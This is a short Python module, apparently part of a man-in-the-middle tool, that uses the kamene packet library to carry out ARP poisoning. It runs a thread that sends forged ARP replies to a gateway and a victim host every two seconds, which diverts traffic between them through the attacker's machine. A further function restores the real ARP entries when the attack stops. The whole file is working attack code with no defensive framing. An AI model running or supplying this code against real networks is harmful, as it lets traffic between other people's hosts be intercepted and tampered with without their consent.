'''
This file contains the kamene ARP classes and functions this program use
'''

import time

from kamene.all import send
#from kamene.sendrecv import send
from kamene.layers.l2 import ARP

class ArpObj:
    def __init__(self):
        self.IPAddress = ""
        self.MACAddress = ""

def start_arp_poison(globalVars):
    globalVars.arpPosion =True
    globalVars.set_posion_thread()
    globalVars.poison_thread.start()


def start_arp_poison_thread(globalVars, gatewayArp: ArpObj, victimArp: ArpObj):
    while (globalVars.arpPosion == True):
        send(ARP(op=2, pdst=gatewayArp.IPAddress, hwdst=gatewayArp.MACAddress, psrc=victimArp.IPAddress), verbose = False)
        send(ARP(op=2, pdst=victimArp.IPAddress, hwdst=victimArp.MACAddress, psrc=gatewayArp.IPAddress), verbose=False)
        time.sleep(2)
    restore_network(gatewayArp, victimArp)

def restore_network(gatewayArp: ArpObj, victimArp: ArpObj):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gatewayArp.IPAddress, hwsrc=victimArp.MACAddress, psrc=victimArp.IPAddress), count=5, verbose=False)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=victimArp.IPAddress, hwsrc=gatewayArp.MACAddress, psrc=gatewayArp.IPAddress), count=5, verbose=False)